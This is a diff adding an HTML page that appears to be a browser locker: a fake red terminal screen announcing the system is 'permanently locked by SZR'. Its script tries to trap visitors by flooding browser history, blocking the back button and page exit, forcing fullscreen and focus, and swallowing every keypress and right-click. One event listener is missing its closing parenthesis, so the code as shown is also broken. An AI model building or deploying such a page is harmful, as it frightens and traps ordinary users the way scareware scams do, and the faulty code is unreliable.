@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SZR-SEC // SYSTEM_LOCKED</title>
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    user-select: none;
+    -webkit-user-select: none;
+    font-family: 'Courier New', Courier, monospace;
+}
+html, body {
+    width: 100%;
+    height: 100dvh;
+    background-color: #030303;
+    color: #ff3333;
+    overflow: hidden;
+    touch-action: none;
+    overscroll-behavior: none;
+    position: fixed;
+}
+body::after {
+    content: " ";
+    display: block;
+    position: fixed;
+    top: 0; left: 0; bottom: 0; right: 0;
+    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+    z-index: 999998;
+    background-size: 100% 2px, 3px 100%;
+    pointer-events: none;
+}
+.terminal-container {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 15px;
+    z-index: 999999;
+}
+.terminal-box {
+    background: #080808;
+    border: 1px solid #ff3333;
+    box-shadow: 0 0 20px rgba(255, 51, 51, 0.2);
+    padding: 30px 25px;
+    width: 100%;
+    max-width: 450px;
+    position: relative;
+    text-align: center;
+}
+.terminal-box::before {
+    content: "root@szr-wifi:~# ./lockdown.sh";
+    display: block;
+    font-size: 11px;
+    color: #555;
+    margin-bottom: 15px;
+    border-bottom: 1px dashed #222;
+    padding-bottom: 5px;
+    text-align: left;
+}
+.ascii-banner {
+    color: #ff3333;
+    font-size: 11px;
+    line-height: 1.1;
+    white-space: pre;
+    margin-bottom: 20px;
+    font-weight: bold;
+    text-shadow: 0 0 8px rgba(255, 51, 51, 0.5);
+}
+.status-text {
+    font-size: 13px;
+    color: #ff9999;
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+.status-text span {
+    color: #ff3333;
+    font-weight: bold;
+}
+.terminal-footer {
+    margin-top: 15px;
+    font-size: 10px;
+    color: #555;
+    text-align: right;
+}
+</style>
+</head>
+<body>
+<div class="terminal-container" id="screenCatcher">
+    <div class="terminal-box" id="lockCard">
+        <div class="ascii-banner">
+███████╗███████╗██████╗ 
+██╔════╝╚══███╔╝██╔══██╗
+███████╗  ███╔╝ ██████╔╝
+╚════██║ ███╔╝  ██╔══██╗
+███████║███████╗██║  ██║
+╚══════╝╚══════╝╚═╝  ╚═╝
+        </div>
+        <div class="status-text">
+            [!] SYSTEM PERMANENTLY LOCKED <span>BY SZR</span><br>
+            > Access denied. No authentication route available. Terminal frozen.
+        </div>
+        <div class="terminal-footer">SEC_PROTOCOL // PERMANENT_LOCK</div>
+    </div>
+</div>
+<script>
+for (let i = 0; i < 30; i++) {
+    history.pushState({lockId: i}, "", window.location.href);
+}
+window.addEventListener('popstate', function () {
+    history.pushState({lockId: Date.now()}, "", window.location.href);
+});
+window.addEventListener('beforeunload', function (e) {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+}
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        window.focus();
+    }
+});
+window.addEventListener('blur', function() {
+    window.focus();
+});
+function enforceLock(e) {
+    if (e) {
+        e.preventDefault();
+        e.stopPropagation();
+    }
+    let elem = document.documentElement;
+    if (!document.fullscreenElement) {
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen().catch(() => {});
+        }
+    }
+}
+const catcher = document.getElementById('screenCatcher');
+const card = document.getElementById('lockCard');
+catcher.addEventListener('pointerdown', enforceLock, { passive: false });
+catcher.addEventListener('touchstart', enforceLock, { passive: false });
+catcher.addEventListener('click', enforceLock);
+card.addEventListener('pointerdown', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
+card.addEventListener('touchstart', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
+card.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); });
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+});
+</script>
+</body>
+</html>
